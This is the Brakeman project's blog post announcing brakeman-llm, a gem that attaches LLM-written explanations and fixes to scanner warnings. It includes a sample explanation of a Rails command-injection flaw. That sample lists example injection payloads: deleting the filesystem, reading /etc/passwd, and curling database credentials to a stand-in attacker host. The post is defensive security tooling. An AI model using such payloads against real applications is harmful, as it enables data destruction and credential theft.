@@ -1,0 +1,298 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Brakeman: Brakeman-LLM Released</title>
+    <meta name="description" content="Brakeman is a static analysis security vulnerability scanner for Ruby on Rails applications."/>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="/stylesheets/screen.css">
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+
+    <meta name="og:title" content="Brakeman - Brakeman-LLM Released" />
+    <meta name="og:description" content="Brakeman Static Analysis Security Scanner for Ruby on Rails" />
+    <meta name="og:image:secure" content="https://brakemanscanner.org/images/brakeman_logo_dark.png" />
+    <meta name="twitter:image" content="https://brakemanscanner.org/images/brakeman_logo_dark.png" />
+</head>
+<body class="blog">
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <nav class="nav">
+                <a href="/" class="logo">
+                    <img src="/images/brakeman_logo_small.png" alt="Brakeman Logo">
+                    Brakeman
+                </a>
+                <ul class="nav-links"><li>
+                            <a href="/docs/">
+                                Documentation
+                            </a>
+                        </li><li>
+                            <a href="/blog/archives">
+                                News
+                            </a>
+                        </li><li>
+                            <a href="https://github.com/presidentbeef/brakeman">
+                                Code
+                            </a>
+                        </li></ul>
+                <div class="mobile-menu-toggle">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <div class="blog-container">
+    <div class="container">
+        <div class="blog-layout">
+            <!-- Sidebar -->
+            <aside class="blog-sidebar fade-in stagger-1">
+                <div class="sidebar-card">
+                    <h4>Recent Posts</h4>
+                    
+                        <a href="/blog/2025/11/03/brakeman-7-dot-1-dot-1-released">Brakeman 7.1.1 Released</a>
+                    
+                        <a href="/blog/2025/08/30/brakeman-llm-released">Brakeman-LLM Released</a>
+                    
+                        <a href="/blog/2025/07/18/brakeman-7-dot-1-dot-0-released">Brakeman 7.1.0 Released</a>
+                    
+                        <a href="/blog/2025/04/04/brakeman-7-dot-0-dot-2-released">Brakeman 7.0.2 Released</a>
+                    
+                </div>
+
+                <div class="sidebar-card">
+                    <h4>Quick Links</h4>
+                    <a href="/docs/quickstart/">Quick Start</a>
+                    <a href="/docs/">Documentation</a>
+                    <a href="https://github.com/presidentbeef/brakeman/issues">Report Issues</a>
+                    <a href="https://github.com/presidentbeef/brakeman">GitHub Repository</a>
+                </div>
+            </aside>
+
+            <!-- Main Article -->
+            <div class="article-container">
+                <!-- Mobile Sidebar Toggle -->
+                <div class="sidebar-toggle">
+                    <span>Quick Navigation</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+
+                <article class="article-main fade-in">
+                    <div class="article-header">
+                        <div class="article-meta">
+                            <span class="date-badge">August 30, 2025</span>
+                        </div>
+                        <h1 class="article-title">Brakeman-LLM Released</h1>
+                        
+                            <p class="article-subtitle">LLM-powered sprinkles for Brakeman</p>
+                        
+                    </div>
+
+                    <div class="article-content">
+                        
+
+
+			<div class="feature-section">
+			    <p>A long time ago, when Brakeman was first designed, its output was optimized to fit into tables like this, with one warning per line:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+------------+----------------+--------------+-------------------+--------+------------------------------------------------------------------------+
+| Confidence | Class          | Method       | Warning Type      | CWE ID | Message                                                                |
++------------+----------------+--------------+-------------------+--------+------------------------------------------------------------------------+
+| High       | HomeController | test_command | Command Injection | [77]   | Possible command injection near line 34: `ls #{+params[:file_name]+}`  |
+| High       | HomeController | test_command | Command Injection | [77]   | Possible command injection near line 36: system(+params[:user_input]+) |
++------------+----------------+--------------+-------------------+--------+------------------------------------------------------------------------+
+</code></pre></div></div>
+
+<p>This approach severely limited the “message” that described the warning. Brakeman has largely stuck to this limitation, even though the default output now looks like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Confidence: High
+Category: Command Injection
+Check: Execute
+Message: Possible command injection
+Code: `ls #{params[:file_name]}`
+File: app/controllers/home_controller.rb
+Line: 34
+
+Confidence: High
+Category: Command Injection
+Check: Execute
+Message: Possible command injection
+Code: system(params[:user_input])
+File: app/controllers/home_controller.rb
+Line: 36
+</code></pre></div></div>
+
+<p>From the beginning, Brakeman was intended as tool primarily for <em>developers</em>, not security professionals.
+However, it’s fairly clear that “Possible command injection” isn’t enough content for most non-security folks.</p>
+
+<p>Also, wouldn’t it be nice if the message used some of the known context about the warning? Like the code involved? And how about recommendations on how to fix the potential security issue??</p>
+
+<p>Historically, this was pretty hard and I didn’t have a lot of motivation to build something that complex.</p>
+
+<h2 id="brakeman-llm">Brakeman-LLM</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">brakeman-llm</code> gem extends Brakeman with LLM-generated warning descriptions.</p>
+
+<p>Under the hood, this is actually pretty simple, but it’s been designed to hook into Brakeman as seamlessly as possible.
+Once a scan is complete, each warning is sent to an LLM of your choosing with a basic prompt to explain the warning and recommendations for how to fix it.</p>
+
+<p>The quality of the results naturally depend on your LLM, but here is an example using Anthropic Claude:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Confidence: High
+Category: Command Injection
+Check: Execute
+Code: `ls #{params[:dir]}`
+File: app/controllers/users_controller.rb
+Line: 78
+Message: Possible command injection
+
+This is a **critical command injection vulnerability** where user-controlled input
+from `params[:dir]` is directly interpolated into a shell command without sanitization or validation.
+
+### The Problem
+
+The code executes:
+```ruby
+`ls #{params[:dir]}`
+```
+
+The backtick operator in Ruby executes shell commands. By directly embedding `params[:dir]` into the
+command string, an attacker can inject arbitrary shell commands. For example, if a malicious user provides:
+
+- `params[:dir] = "; rm -rf /"` → executes `ls ; rm -rf /` (attempts to delete the filesystem)
+- `params[:dir] = "| cat /etc/passwd"` → executes `ls | cat /etc/passwd` (exposes sensitive files)
+- `params[:dir] = "&amp;&amp; curl attacker.com?data=$(cat config/database.yml)"` → exfiltrates database credentials
+
+This vulnerability allows complete system compromise with the privileges of the Rails application process.
+
+### Fixes
+
+**1. Avoid shell execution entirely (Recommended)**
+Use Ruby's built-in file system methods instead:
+```ruby
+Dir.entries(params[:dir])
+# or
+Dir.glob(File.join(params[:dir], '*'))
+```
+
+**2. Use array-based command execution**
+If shell commands are necessary, use array syntax to prevent injection:
+```ruby
+system('ls', params[:dir])
+```
+This passes `params[:dir]` as a separate argument, preventing shell interpretation of special characters.
+
+**3. Strict input validation**
+Whitelist allowed values or validate against a strict pattern:
+```ruby
+dir = params[:dir]
+raise "Invalid directory" unless dir.match?(/\A[a-zA-Z0-9_\-\/]+\z/)
+`ls #{Shellwords.escape(dir)}`
+```
+
+**4. Use Shellwords.escape**
+If interpolation is unavoidable:
+```ruby
+require 'shellwords'
+`ls #{Shellwords.escape(params[:dir])}`
+```
+
+### Best Practice
+
+Never execute shell commands with user input. The first solution (using Ruby's `Dir` methods) is strongly
+preferred as it eliminates the attack vector entirely. Shell execution should be a last resort and always
+requires careful input sanitization.
+
+(The above message is auto-generated and may contain errors.)
+</code></pre></div></div>
+
+<p>Note that the description above not only shows how to avoid command injection, it provides better approaches to listing files generally (which is what the original code was doing).</p>
+
+<h3 id="usage">Usage</h3>
+
+<p>Install <code class="language-plaintext highlighter-rouge">brakeman-llm</code> gem as usual (Gemfile, etc.)</p>
+
+<p>Use <code class="language-plaintext highlighter-rouge">brakeman-llm</code> to run. All regular Brakeman options should work.</p>
+
+<p>LLM options:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">--llm-provider</code> - LLM provider (Ollama, OpenAI, Anthropic, etc. - required)</li>
+  <li><code class="language-plaintext highlighter-rouge">--llm-model</code> - LLM model name (required)</li>
+  <li><code class="language-plaintext highlighter-rouge">--llm-api-key</code> - API key for LLM provider (optional, depending on provider)</li>
+  <li><code class="language-plaintext highlighter-rouge">--llm-api-base</code> - The URL to use For Ollama and other alternative providers</li>
+</ul>
+
+<p>See the <a href="https://github.com/presidentbeef/brakeman-llm?tab=readme-ov-file#">Brakeman-LLM documentation</a> for more options
+and information on configuration.</p>
+
+<h4 id="example-commands">Example Commands</h4>
+
+<p>Using Ollama locally:</p>
+
+<p><code class="language-plaintext highlighter-rouge">brakeman-llm --llm-provider ollama --llm-model gemma3:4b --llm-api-base http://localhost:11434/v1</code></p>
+
+<p>Using Anthropic Claude:</p>
+
+<p><code class="language-plaintext highlighter-rouge">brakeman-llm --llm-provider anthropic --llm-model claude-sonnet-4-5 --llm-api-key YOUR_CLAUDE_API_KEY</code></p>
+
+<h3 id="how-it-works">How It Works</h3>
+
+<p>Brakeman-LLM provides a wrapper combining Brakeman and <a href="https://rubyllm.com/">RubyLLM</a>.</p>
+
+<p>After the Brakeman scan runs, the LLM provider is invoked for each warning with a basic prompt requesting analysis and remediation.
+The LLM is provided the warning in JSON and additional information about the warning type.</p>
+
+<p>A disclaimer will be appended to the LLM output. This disclaimer may be configured or removed using <code class="language-plaintext highlighter-rouge">--llm-disclaimer</code>.</p>
+
+<p>For text reports, the result from the LLM will be appended to the warning message.
+For JSON reports, the result will be added as a new key called <code class="language-plaintext highlighter-rouge">llm_analysis</code>.</p>
+
+<p>The instructions and prompt for the LLM can be adjusted as desired.</p>
+
+<p>Brakeman 7.1.1 added word wrapping for text output when using the default pager, which makes
+the long explanations from the LLM more legible.</p>
+
+<h2 id="reporting-issues">Reporting Issues</h2>
+
+<p>Please report any <a href="https://github.com/presidentbeef/brakeman-llm/issues">issues</a> or suggestions!</p>
+
+			</div>
+
+                        
+
+                        <div class="reporting-section">
+                            <h3>Reporting Issues</h3>
+                            <p>Thank you to everyone who reported bugs and contributed to this release!</p>
+                            <p>Please report any <a href="https://github.com/presidentbeef/brakeman/issues">issues</a> with this release. Take a look at <a href="https://github.com/presidentbeef/brakeman/wiki/How-to-Report-a-Brakeman-Issue">this guide</a> to reporting Brakeman problems.</p>
+                            <p>Hang out <a href="https://github.com/presidentbeef/brakeman/discussions">on GitHub</a> for questions and discussion.</p>
+                        </div>
+                    </div>
+                </article>
+            </div>
+        </div>
+    </div>
+</div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content"><div class="footer-section">
+                        <h4>Project</h4><a href="/docs/">Documentation</a><a href="https://github.com/presidentbeef/brakeman/releases">Changelog</a></div><div class="footer-section">
+                        <h4>Community</h4><a href="https://github.com/presidentbeef/brakeman">GitHub</a><a href="https://github.com/presidentbeef/brakeman/discussions">Discussions</a><a href="https://github.com/presidentbeef/brakeman/issues">Issues</a><a href="/contributing/">Contributing</a></div><div class="footer-section">
+                        <h4>Resources</h4><a href="/docs/quickstart/">Getting Started</a><a href="https://guides.rubyonrails.org/security.html">Rails Security Guide</a></div></div>
+        </div>
+    </footer>
+
+    <script src="/javascripts/main.js"></script>
+</body>
+</html>
